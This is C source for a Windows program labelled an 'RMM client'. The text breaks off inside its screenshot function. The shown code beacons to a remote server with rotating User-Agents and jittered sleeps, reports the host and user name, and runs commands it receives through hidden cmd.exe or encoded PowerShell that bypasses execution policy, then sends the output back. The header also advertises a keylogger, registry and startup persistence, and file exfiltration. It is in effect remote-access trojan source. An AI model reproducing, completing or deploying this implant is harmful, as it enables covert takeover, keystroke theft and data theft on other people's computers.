/*
 * client_rmm.c  –  Minimal RMM C Client for Windows
 *
 * Preserves all functionality of client_rmm.ps1:
 *   - HTTP beacon (WinHTTP, no external libs)
 *   - CMD / PowerShell / pwsh command execution with CWD tracking
 *   - File download (exfil) and upload
 *   - PNG screenshot via GDI + GDI+ (loaded at runtime)
 *   - Keylogger thread
 *   - Persistence (startup folder + registry run key)
 *   - Jitter, exponential back-off, random User-Agent rotation
 *   - Dynamic __CONFIG__ updates
 *
 * Build (Visual Studio Developer Command Prompt):
 *   cl /nologo /W3 /O2 client_rmm.c ^
 *      /link winhttp.lib ole32.lib gdi32.lib advapi32.lib shell32.lib user32.lib
 *
 * Configuration:
 *   Set the environment variable  RMM_BASE_URL  to your server base URL
 *   (no trailing slash, e.g. http://10.0.0.1:8080) before running,
 *   or edit DEFAULT_BASE_URL below.
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <objbase.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

/* =========================================================================
 * Configuration constants
 * ========================================================================= */
#define DEFAULT_BASE_URL     "http://127.0.0.1:8080"
#define DEFAULT_SLEEP_SEC    60
#define DEFAULT_JITTER_PCT   30
#define MAX_RETRIES          3
#define UPLOAD_B64_CAP       12000000   /* ~9 MB binary; matches PS client */
#define KEYLOG_FLUSH_LEN     400        /* chars before auto-flush to disk  */
#define KEYLOG_POLL_MS       40

/* =========================================================================
 * GDI+ flat-API declarations (avoids C++ gdiplus.h)
 * ========================================================================= */
typedef struct {
    UINT32    GdiplusVersion;
    ULONG_PTR DebugEventCallback;
    BOOL      SuppressBackgroundThread;
    BOOL      SuppressExternalCodecs;
} GdiplusStartupInput_t;

typedef struct {
    CLSID  Clsid;
    GUID   FormatID;
    WCHAR *CodecName;
    WCHAR *DllName;
    WCHAR *FormatDescription;
    WCHAR *FilenameExtension;
    WCHAR *MimeType;
    DWORD  Flags;
    DWORD  Version;
    DWORD  SigCount;
    DWORD  SigSize;
    BYTE  *SigPattern;
    BYTE  *SigMask;
} ImageCodecInfo_t;

typedef int (WINAPI *PFN_GdiplusStartup)        (ULONG_PTR*, const GdiplusStartupInput_t*, void*);
typedef void(WINAPI *PFN_GdiplusShutdown)        (ULONG_PTR);
typedef int (WINAPI *PFN_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, void**);
typedef int (WINAPI *PFN_GdipSaveImageToStream)  (void*, IStream*, const CLSID*, const void*);
typedef int (WINAPI *PFN_GdipDisposeImage)       (void*);
typedef int (WINAPI *PFN_GdipGetImageEncodersSize)(UINT*, UINT*);
typedef int (WINAPI *PFN_GdipGetImageEncoders)   (UINT, UINT, void*);

/* =========================================================================
 * Global state
 * ========================================================================= */
static char  g_base_url[512];
static char  g_session_id[48];
static int   g_sleep_sec  = DEFAULT_SLEEP_SEC;
static int   g_jitter_pct = DEFAULT_JITTER_PCT;
static char  g_cwd[MAX_PATH];

/* Keylogger state */
static volatile BOOL g_keylog_active = FALSE;
static HANDLE        g_keylog_thread = NULL;
static char          g_keylog_path[MAX_PATH];

/* =========================================================================
 * User-Agent rotation (matches PS client list)
 * ========================================================================= */
static const char *UA_LIST[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
};
#define UA_COUNT ((int)(sizeof(UA_LIST)/sizeof(UA_LIST[0])))

static const char *random_ua(void) {
    return UA_LIST[rand() % UA_COUNT];
}

/* =========================================================================
 * Base64 encode / decode
 * ========================================================================= */
static const char B64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Returns heap-allocated base64 string (caller frees). out_len optional. */
static char *b64_encode(const unsigned char *src, size_t src_len, size_t *out_len) {
    size_t enc_len = 4 * ((src_len + 2) / 3);
    char *dst = (char*)malloc(enc_len + 1);
    if (!dst) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < src_len;) {
        DWORD octet_a = i < src_len ? src[i++] : 0;
        DWORD octet_b = i < src_len ? src[i++] : 0;
        DWORD octet_c = i < src_len ? src[i++] : 0;
        DWORD triple  = (octet_a << 16) | (octet_b << 8) | octet_c;
        dst[j++] = B64_CHARS[(triple >> 18) & 0x3F];
        dst[j++] = B64_CHARS[(triple >> 12) & 0x3F];
        dst[j++] = B64_CHARS[(triple >>  6) & 0x3F];
        dst[j++] = B64_CHARS[(triple      ) & 0x3F];
    }
    int pad = (3 - (src_len % 3)) % 3;
    for (int k = 0; k < pad; k++) dst[enc_len - 1 - k] = '=';
    dst[enc_len] = '\0';
    if (out_len) *out_len = enc_len;
    return dst;
}

static int b64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/* Returns heap-allocated bytes (caller frees). *out_len set. */
static unsigned char *b64_decode(const char *src, size_t src_len, size_t *out_len) {
    if (src_len % 4 != 0) src_len = src_len - (src_len % 4);
    size_t dec_len = (src_len / 4) * 3;
    if (src_len > 0 && src[src_len-1] == '=') dec_len--;
    if (src_len > 1 && src[src_len-2] == '=') dec_len--;
    unsigned char *dst = (unsigned char*)malloc(dec_len + 1);
    if (!dst) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < src_len; i += 4) {
        int a = b64_decode_char(src[i]);
        int b = b64_decode_char(src[i+1]);
        int c = (src[i+2] != '=') ? b64_decode_char(src[i+2]) : 0;
        int d = (src[i+3] != '=') ? b64_decode_char(src[i+3]) : 0;
        if (a < 0 || b < 0) continue;
        DWORD triple = ((DWORD)a << 18) | ((DWORD)b << 12) | ((DWORD)c << 6) | (DWORD)d;
        if (j < dec_len) dst[j++] = (triple >> 16) & 0xFF;
        if (j < dec_len) dst[j++] = (triple >>  8) & 0xFF;
        if (j < dec_len) dst[j++] = (triple      ) & 0xFF;
    }
    dst[dec_len] = '\0';
    *out_len = dec_len;
    return dst;
}

/* =========================================================================
 * Minimal JSON helpers
 * ========================================================================= */

/*
 * Extract first occurrence of "key":"value" from a JSON string.
 * Returns 1 on success, 0 on failure.  Handles escaped backslash / quote.
 */
static int json_get_string(const char *json, const char *key,
                           char *out_buf, int out_size) {
    /* Build search pattern: "key": */
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) return 0;
    p += strlen(pattern);
    while (*p == ' ' || *p == '\t' || *p == ':') p++;
    if (*p != '"') return 0;
    p++;  /* skip opening quote */
    int i = 0;
    while (*p && *p != '"' && i < out_size - 1) {
        if (*p == '\\') {
            p++;
            switch (*p) {
                case '"':  out_buf[i++] = '"';  break;
                case '\\': out_buf[i++] = '\\'; break;
                case '/':  out_buf[i++] = '/';  break;
                case 'n':  out_buf[i++] = '\n'; break;
                case 'r':  out_buf[i++] = '\r'; break;
                case 't':  out_buf[i++] = '\t'; break;
                default:   out_buf[i++] = *p;   break;
            }
        } else {
            out_buf[i++] = *p;
        }
        p++;
    }
    out_buf[i] = '\0';
    return 1;
}

/*
 * Build a JSON result body: {"rmm_cmd":"<cmd>","rmm_output":"<out>"}
 * Caller must free the returned string.
 */
static char *build_output_json(const char *cmd, const char *output) {
    /* Escape cmd and output for JSON */
    size_t cmd_len    = strlen(cmd);
    size_t output_len = strlen(output);
    /* Worst case: every char escaped → *2 */
    char *ecmd = (char*)malloc(cmd_len * 2 + 1);
    char *eout = (char*)malloc(output_len * 2 + 1);
    if (!ecmd || !eout) { free(ecmd); free(eout); return NULL; }

    size_t j = 0;
    for (size_t i = 0; i < cmd_len; i++) {
        unsigned char c = (unsigned char)cmd[i];
        if (c == '"')       { ecmd[j++] = '\\'; ecmd[j++] = '"'; }
        else if (c == '\\') { ecmd[j++] = '\\'; ecmd[j++] = '\\'; }
        else if (c == '\n') { ecmd[j++] = '\\'; ecmd[j++] = 'n'; }
        else if (c == '\r') { ecmd[j++] = '\\'; ecmd[j++] = 'r'; }
        else if (c == '\t') { ecmd[j++] = '\\'; ecmd[j++] = 't'; }
        else                { ecmd[j++] = c; }
    }
    ecmd[j] = '\0';

    j = 0;
    for (size_t i = 0; i < output_len; i++) {
        unsigned char c = (unsigned char)output[i];
        if (c == '"')       { eout[j++] = '\\'; eout[j++] = '"'; }
        else if (c == '\\') { eout[j++] = '\\'; eout[j++] = '\\'; }
        else if (c == '\n') { eout[j++] = '\\'; eout[j++] = 'n'; }
        else if (c == '\r') { eout[j++] = '\\'; eout[j++] = 'r'; }
        else if (c == '\t') { eout[j++] = '\\'; eout[j++] = 't'; }
        else                { eout[j++] = c; }
    }
    eout[j] = '\0';

    size_t total = strlen(ecmd) + strlen(eout) + 64;
    char *result = (char*)malloc(total);
    if (result)
        snprintf(result, total, "{\"rmm_cmd\":\"%s\",\"rmm_output\":\"%s\"}", ecmd, eout);
    free(ecmd);
    free(eout);
    return result;
}

/* =========================================================================
 * Wide / narrow string utilities
 * ========================================================================= */
static wchar_t *utf8_to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t*)malloc(n * sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

static char *wide_to_utf8(const wchar_t *w) {
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
    char *s = (char*)malloc(n);
    if (s) WideCharToMultiByte(CP_UTF8, 0, w, -1, s, n, NULL, NULL);
    return s;
}

/* =========================================================================
 * URL parsing  (scheme, host, port, path-prefix)
 * ========================================================================= */
static wchar_t g_srv_host[256];
static int     g_srv_port;
static BOOL    g_srv_https;
static wchar_t g_srv_path_prefix[256];  /* e.g. L"" or L"/api" */

static void parse_base_url(const char *url) {
    const char *p = url;
    g_srv_https = FALSE;
    if (_strnicmp(p, "https://", 8) == 0) { g_srv_https = TRUE; p += 8; }
    else if (_strnicmp(p, "http://",  7) == 0) { p += 7; }

    /* host[:port][/path] */
    char host_buf[256] = {0};
    int  port = g_srv_https ? 443 : 80;
    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');

    if (colon && (!slash || colon < slash)) {
        int hlen = (int)(colon - p);
        strncpy(host_buf, p, hlen);
        host_buf[hlen] = '\0';
        port = atoi(colon + 1);
        if (slash) port = (int)strtol(colon + 1, NULL, 10);
    } else if (slash) {
        int hlen = (int)(slash - p);
        strncpy(host_buf, p, hlen);
        host_buf[hlen] = '\0';
    } else {
        strncpy(host_buf, p, sizeof(host_buf) - 1);
    }

    wchar_t *whost = utf8_to_wide(host_buf);
    wcsncpy(g_srv_host, whost, 255);
    free(whost);
    g_srv_port = port;

    /* Path prefix (rarely used, but support e.g. http://host:8080/rmm) */
    if (slash) {
        /* Strip port from slash search above */
        const char *path_start = slash;
        wchar_t *wp = utf8_to_wide(path_start);
        wcsncpy(g_srv_path_prefix, wp, 255);
        /* Remove trailing slash */
        int wl = (int)wcslen(g_srv_path_prefix);
        if (wl > 1 && g_srv_path_prefix[wl-1] == L'/') g_srv_path_prefix[wl-1] = L'\0';
        free(wp);
    } else {
        g_srv_path_prefix[0] = L'\0';
    }
}

/* =========================================================================
 * HTTP helpers  (WinHTTP)
 * ========================================================================= */
typedef struct { char *body; int status; int len; } HttpResp;

static void http_resp_free(HttpResp *r) {
    if (r) { free(r->body); free(r); }
}

/* Build full wchar path: prefix + endpoint, e.g. L"/cmd?id=..." */
static wchar_t *make_path(const char *endpoint) {
    wchar_t *wep = utf8_to_wide(endpoint);
    size_t n = wcslen(g_srv_path_prefix) + wcslen(wep) + 2;
    wchar_t *full = (wchar_t*)malloc(n * sizeof(wchar_t));
    if (full) {
        wcscpy(full, g_srv_path_prefix);
        wcscat(full, wep);
    }
    free(wep);
    return full;
}

static HttpResp *http_request(const char *method,
                               const char *endpoint,
                               const char *content_type,
                               const void *body_data,
                               DWORD body_len) {
    HttpResp *resp = (HttpResp*)calloc(1, sizeof(HttpResp));
    if (!resp) return NULL;
    resp->status = -1;

    wchar_t *wua  = utf8_to_wide(random_ua());
    HINTERNET hsess = WinHttpOpen(wua,
                                  WINHTTP_ACCESS_TYPE_NO_PROXY,
                                  WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
    free(wua);
    if (!hsess) { free(resp); return NULL; }

    DWORD flags = g_srv_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hconn = WinHttpConnect(hsess, g_srv_host, (INTERNET_PORT)g_srv_port, 0);
    if (!hconn) { WinHttpCloseHandle(hsess); free(resp); return NULL; }

    wchar_t *wmethod = utf8_to_wide(method);
    wchar_t *wpath   = make_path(endpoint);
    HINTERNET hreq = WinHttpOpenRequest(hconn, wmethod, wpath,
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        flags);
    free(wmethod); free(wpath);
    if (!hreq) {
        WinHttpCloseHandle(hconn); WinHttpCloseHandle(hsess);
        free(resp); return NULL;
    }

    /* Additional headers */
    char req_id[48];
    GUID g; CoCreateGuid(&g);
    snprintf(req_id, sizeof(req_id),
             "X-Request-ID: %08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
             (unsigned long)g.Data1, g.Data2, g.Data3,
             g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
             g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7]);
    char hdr_buf[512];
    snprintf(hdr_buf, sizeof(hdr_buf),
             "Accept: */*\r\nCache-Control: no-cache\r\n%s\r\n", req_id);
    if (content_type) {
        char ct_hdr[256];
        snprintf(ct_hdr, sizeof(ct_hdr), "Content-Type: %s\r\n", content_type);
        strncat(hdr_buf, ct_hdr, sizeof(hdr_buf) - strlen(hdr_buf) - 1);
    }
    wchar_t *whdr = utf8_to_wide(hdr_buf);
    WinHttpAddRequestHeaders(hreq, whdr, (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    free(whdr);

    BOOL ok = WinHttpSendRequest(hreq,
                                 WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 (LPVOID)body_data, body_len, body_len, 0);
    if (!ok || !WinHttpReceiveResponse(hreq, NULL)) {
        WinHttpCloseHandle(hreq); WinHttpCloseHandle(hconn); WinHttpCloseHandle(hsess);
        free(resp); return NULL;
    }

    /* Status code */
    DWORD status_code = 0, sz = sizeof(DWORD);
    WinHttpQueryHeaders(hreq,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        &status_code, &sz, WINHTTP_NO_HEADER_INDEX);
    resp->status = (int)status_code;

    /* Read body */
    size_t alloc = 4096, used = 0;
    char *buf = (char*)malloc(alloc);
    DWORD avail = 0, read_bytes = 0;
    while (WinHttpQueryDataAvailable(hreq, &avail) && avail > 0) {
        if (used + avail + 1 > alloc) {
            alloc = used + avail + 4096;
            char *tmp = (char*)realloc(buf, alloc);
            if (!tmp) { free(buf); buf = NULL; break; }
            buf = tmp;
        }
        WinHttpReadData(hreq, buf + used, avail, &read_bytes);
        used += read_bytes;
    }
    if (buf) { buf[used] = '\0'; resp->body = buf; resp->len = (int)used; }

    WinHttpCloseHandle(hreq);
    WinHttpCloseHandle(hconn);
    WinHttpCloseHandle(hsess);
    return resp;
}

static HttpResp *http_get(const char *endpoint) {
    return http_request("GET", endpoint, NULL, NULL, 0);
}

static HttpResp *http_post(const char *endpoint,
                            const char *content_type,
                            const void *body, DWORD body_len) {
    return http_request("POST", endpoint, content_type, body, body_len);
}

/* =========================================================================
 * GUID generation
 * ========================================================================= */
static void gen_guid(char *out, int out_size) {
    GUID g;
    CoCreateGuid(&g);
    snprintf(out, out_size,
             "%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
             (unsigned long)g.Data1, g.Data2, g.Data3,
             g.Data4[0], g.Data4[1],
             g.Data4[2], g.Data4[3], g.Data4[4],
             g.Data4[5], g.Data4[6], g.Data4[7]);
}

/* =========================================================================
 * Jitter / sleep
 * ========================================================================= */
static void jittered_sleep(int base_sec, int jitter_pct) {
    int range_ms = base_sec * 1000 * jitter_pct / 100;
    int jitter_ms = 0;
    if (range_ms > 0)
        jitter_ms = (rand() % (range_ms * 2 + 1)) - range_ms;
    int micro_ms = 100 + (rand() % 900);     /* 100–999 ms micro-jitter */
    int total_ms = base_sec * 1000 + jitter_ms + micro_ms;
    if (total_ms < 1000) total_ms = 1000;
    printf("[*] Sleeping %d ms (base %ds, jitter %dms)\n", total_ms, base_sec, jitter_ms);
    Sleep((DWORD)total_ms);
}

static void backoff_sleep(int retry_count) {
    int backoff = 1;
    int cap = retry_count < 10 ? retry_count : 10;
    for (int i = 0; i < cap; i++) {
        backoff *= 2;
        if (backoff > 60) { backoff = 60; break; }
    }
    jittered_sleep(backoff, 30);
}

/* =========================================================================
 * URL-encode a string (query parameter value)
 * ========================================================================= */
static void url_encode(const char *src, char *dst, int dst_size) {
    static const char hex[] = "0123456789ABCDEF";
    int j = 0;
    for (int i = 0; src[i] && j < dst_size - 4; i++) {
        unsigned char c = (unsigned char)src[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            dst[j++] = (char)c;
        } else {
            dst[j++] = '%';
            dst[j++] = hex[(c >> 4) & 0xF];
            dst[j++] = hex[c & 0xF];
        }
    }
    dst[j] = '\0';
}

/* =========================================================================
 * Registration
 * ========================================================================= */
static int rmm_register(void) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    char username[256] = {0};
    DWORD sz = sizeof(hostname); GetComputerNameA(hostname, &sz);
    sz = sizeof(username);       GetUserNameA(username, &sz);

    char eh[512], eu[512];
    url_encode(hostname, eh, sizeof(eh));
    url_encode(username, eu, sizeof(eu));

    char endpoint[1024];
    snprintf(endpoint, sizeof(endpoint),
             "/register?id=%s&h=%s&u=%s", g_session_id, eh, eu);

    HttpResp *r = http_get(endpoint);
    if (!r) return 0;
    int code = r->status;
    http_resp_free(r);
    return (code == 200);
}

/* =========================================================================
 * Command polling
 * Returns heap-allocated JSON string (caller frees), or NULL on error.
 * ========================================================================= */
static char *rmm_get_cmd(void) {
    char endpoint[256];
    snprintf(endpoint, sizeof(endpoint), "/cmd?id=%s", g_session_id);
    HttpResp *r = http_get(endpoint);
    if (!r || r->status != 200) { http_resp_free(r); return NULL; }
    char *body = r->body; r->body = NULL;
    http_resp_free(r);
    return body;
}

/* =========================================================================
 * Result posting
 * ========================================================================= */
static void rmm_post_result(const char *type,
                             const void *body, DWORD body_len,
                             const char *content_type) {
    char endpoint[256];
    if (type && *type)
        snprintf(endpoint, sizeof(endpoint), "/result?id=%s&type=%s", g_session_id, type);
    else
        snprintf(endpoint, sizeof(endpoint), "/result?id=%s", g_session_id);
    http_post(endpoint, content_type, body, body_len);
}

static void send_text_result(const char *cmd, const char *output) {
    char *json = build_output_json(cmd, output);
    if (json) {
        rmm_post_result("output", json, (DWORD)strlen(json), "application/json; charset=utf-8");
        free(json);
    }
}

/* =========================================================================
 * Command execution (CMD with CWD tracking)
 * ========================================================================= */

/*
 * Single-quotes that appear in positions where CMD doesn't support them
 * are converted to double-quoted equivalents (mirrors PS client behaviour).
 */
static void normalize_for_cmd(const char *in, char *out, int out_size) {
    /* Map bare "ls" to "dir" */
    if (_stricmp(in, "ls") == 0) {
        strncpy(out, "dir", out_size - 1);
        out[out_size - 1] = '\0';
        return;
    }
    int i = 0, j = 0;
    int len = (int)strlen(in);
    while (i < len && j < out_size - 4) {
        if (in[i] == '\'') {
            int end = -1;
            for (int k = i + 1; k < len; k++) {
                if (in[k] == '\'') { end = k; break; }
            }
            if (end < 0) { out[j++] = in[i++]; continue; }
            out[j++] = '"';
            for (int k = i + 1; k < end && j < out_size - 4; k++) {
                if (in[k] == '"') { out[j++] = '"'; out[j++] = '"'; }
                else              { out[j++] = in[k]; }
            }
            out[j++] = '"';
            i = end + 1;
        } else {
            out[j++] = in[i++];
        }
    }
    out[j] = '\0';
}

/*
 * Run a command via cmd.exe, capture stdout+stderr, update g_cwd.
 * Returns heap-allocated output string (caller frees).
 */
static char *exec_cmd(const char *inner_command) {
    /* Validate / fallback CWD */
    if (!g_cwd[0] || GetFileAttributesA(g_cwd) == INVALID_FILE_ATTRIBUTES) {
        GetEnvironmentVariableA("USERPROFILE", g_cwd, MAX_PATH);
    }

    char norm_cmd[4096];
    normalize_for_cmd(inner_command, norm_cmd, sizeof(norm_cmd));

    /*
     * Write to a temp .bat file to avoid nested-quoting issues that arise
     * when the CWD path contains spaces and is embedded inside cmd /c "...".
     * Batch file quoting is straightforward: cd /d "path" is always safe.
     * %CD% inside a plain batch statement expands correctly (no %% needed).
     */
    char tmp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_path);
    char bat_file[MAX_PATH];
    snprintf(bat_file, MAX_PATH, "%srmm_%lu.bat", tmp_path, GetCurrentProcessId());

    {
        HANDLE hbat = CreateFileA(bat_file, GENERIC_WRITE, 0, NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hbat == INVALID_HANDLE_VALUE)
            return _strdup("(failed to create temp batch file)");
        char bat[8192];
        DWORD wr;
        int n = snprintf(bat, sizeof(bat),
                         "@echo off\r\ncd /d \"%s\"\r\n%s\r\necho RMM_CWD_SIG:%%CD%%\r\n",
                         g_cwd, norm_cmd);
        WriteFile(hbat, bat, (DWORD)n, &wr, NULL);
        CloseHandle(hbat);
    }

    /* Capture stdout+stderr through an anonymous pipe (no shell redirection needed) */
    HANDLE hread, hwrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hread, &hwrite, &sa, 0)) {
        DeleteFileA(bat_file);
        return _strdup("(pipe creation failed)");
    }
    SetHandleInformation(hread, HANDLE_FLAG_INHERIT, 0);

    char cmd_line[MAX_PATH + 32];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /d /c \"%s\"", bat_file);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hwrite;
    si.hStdError  = hwrite;

    PROCESS_INFORMATION pi = {0};
    BOOL created = CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hwrite);  /* close our copy so ReadFile sees EOF when process exits */

    if (!created) {
        CloseHandle(hread);
        DeleteFileA(bat_file);
        return _strdup("(CreateProcess failed)");
    }

    /* Read all output */
    size_t alloc = 8192, used = 0;
    char *output = (char*)malloc(alloc);
    if (!output) { output = _strdup("(out of memory)"); goto cleanup; }

    {
        DWORD rd;
        char buf[4096];
        while (ReadFile(hread, buf, sizeof(buf), &rd, NULL) && rd > 0) {
            if (used + rd + 1 >= alloc) {
                alloc += rd + 4096;
                char *t = (char*)realloc(output, alloc);
                if (t) output = t;
            }
            memcpy(output + used, buf, rd);
            used += rd;
        }
        output[used] = '\0';
    }

cleanup:
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hread);
    DeleteFileA(bat_file);

    /* Strip RMM_CWD_SIG: lines and update g_cwd */
    char clean[65536];
    int ci = 0;
    char *line = output;
    while (line && *line) {
        char *nl = strpbrk(line, "\r\n");
        int line_len = nl ? (int)(nl - line) : (int)strlen(line);
        if (line_len > 12 && strncmp(line, "RMM_CWD_SIG:", 12) == 0) {
            int cwd_len = line_len - 12;
            if (cwd_len >= MAX_PATH) cwd_len = MAX_PATH - 1;
            strncpy(g_cwd, line + 12, cwd_len);
            g_cwd[cwd_len] = '\0';
            int cl = (int)strlen(g_cwd);
            while (cl > 0 && (g_cwd[cl-1] == ' ' || g_cwd[cl-1] == '\r' || g_cwd[cl-1] == '\n'))
                g_cwd[--cl] = '\0';
        } else {
            if (ci + line_len + 2 < (int)sizeof(clean)) {
                memcpy(clean + ci, line, line_len);
                ci += line_len;
                if (nl) clean[ci++] = '\n';
            }
        }
        line = nl ? nl + (nl[0] == '\r' && nl[1] == '\n' ? 2 : 1) : NULL;
    }
    while (ci > 0 && (clean[ci-1] == '\n' || clean[ci-1] == '\r')) ci--;
    clean[ci] = '\0';

    free(output);

    char *result = _strdup(clean);
    if (!result || !result[0]) {
        free(result);
        result = _strdup("Command executed successfully (no output)");
    }
    return result;
}

/*
 * Run a command via powershell.exe (or pwsh.exe) using -EncodedCommand.
 * exe: "powershell.exe" or "pwsh.exe"
 */
static char *exec_powershell(const char *exe, const char *inner_script) {
    /* Build full script: Set-Location + user script + CWD output */
    char cwd_esc[MAX_PATH * 2];
    {
        int j = 0;
        for (int i = 0; g_cwd[i] && j < (int)sizeof(cwd_esc) - 2; i++) {
            if (g_cwd[i] == '\'') cwd_esc[j++] = '\'';
            cwd_esc[j++] = g_cwd[i];
        }
        cwd_esc[j] = '\0';
    }
    char full_script[8192];
    snprintf(full_script, sizeof(full_script),
             "Set-Location -LiteralPath '%s' -ErrorAction SilentlyContinue\r\n"
             "%s\r\n"
             "Write-Output ('RMM_CWD_SIG:' + (Get-Location).Path)",
             cwd_esc, inner_script);

    /* Encode as UTF-16LE base64 */
    int wlen = MultiByteToWideChar(CP_UTF8, 0, full_script, -1, NULL, 0);
    wchar_t *wscript = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (!wscript) return _strdup("(out of memory)");
    MultiByteToWideChar(CP_UTF8, 0, full_script, -1, wscript, wlen);

    /* wlen includes null terminator; encode without it */
    size_t byte_len = (wlen - 1) * sizeof(wchar_t);
    char *enc = b64_encode((unsigned char*)wscript, byte_len, NULL);
    free(wscript);
    if (!enc) return _strdup("(encoding failed)");

    /* Build command line */
    char cmd_line[8192];
    snprintf(cmd_line, sizeof(cmd_line),
             "%s -NoProfile -ExecutionPolicy Bypass -NoLogo -NonInteractive "
             "-EncodedCommand %s",
             exe, enc);
    free(enc);

    /* Execute via cmd exec (capture output the same way) */
    char *result = exec_cmd(cmd_line);
    return result;
}

/* =========================================================================
 * Screenshot (GDI capture → PNG via GDI+)
 * ========================================================================= */
static char *capture_screenshot_b64(void) {
    /* Load GDI+ dynamically */
    HMODULE hgdip = LoadLibraryW(L"gdiplus.dll");
    if (!hgdip) return NULL;

    PFN_GdiplusStartup         pfn_startup   = (PFN_GdiplusStartup)        GetProcAddress(hgdip, "GdiplusStartup");
    PFN_GdiplusShutdown        pfn_shutdown  = (PFN_GdiplusShutdown)       GetProcAddress(hgdip, "GdiplusShutdown");
    PFN_GdipCreateBitmapFromHBITMAP pfn_from_hbm = (PFN_GdipCreateBitmapFromHBITMAP)GetProcAddress(hgdip, "GdipCreateBitmapFromHBITMAP");
    PFN_GdipSaveImageToStream  pfn_save      = (PFN_GdipSaveImageToStream) GetProcAddress(hgdip, "GdipSaveImageToStream");
    PFN_GdipDisposeImage       pfn_dispose   = (PFN_GdipDisposeImage)      GetProcAddress(hgdip, "GdipDisposeImage");
    PFN_GdipGetImageEncodersSize pfn_enc_sz  = (PFN_GdipGetImageEncodersSize)GetProcAddress(hgdip, "GdipGetImageEncodersSize");
    PFN_GdipGetImageEncoders   pfn_enc       = (PFN_GdipGetImageEncoders)  GetProcAddress(hgdip, "GdipGetImageEncoders");

    if (!pfn_startup || !pfn_shutdown || !pfn_from_hbm || !pfn_save ||
        !pfn_dispose || !pfn_enc_sz || !pfn_enc) {
        FreeLibrary(hgdip);
        return NULL;
    }

    ULONG_PTR gdip_token = 0;
    GdiplusStartupInput_t si = { 1, 0, FALSE, FALSE };
    if (pfn_startup(&gdip_token, &si, NULL) != 0) {
        FreeLibrary(hgdip); return NULL;
    }

    /* Screen dimensions */
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    /* Capture screen via GDI */
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc    = CreateCompatibleDC(screen_dc);
    HBITMAP hbm   = CreateCompatibleBitmap(screen_dc, sw, sh);
    SelectObject(mem_dc, hbm);
    BitBlt(mem_dc, 0, 0, sw, sh, screen_dc, 0, 0, SRCCOPY);
    ReleaseDC(NULL, screen_dc);
    DeleteDC(mem_dc);

    /* Create GpBitmap from HBITMAP */
    void *gp_bitmap = NULL;
    pfn_from_hbm(hbm, NULL, &gp_bitmap);
    DeleteObject(hbm);

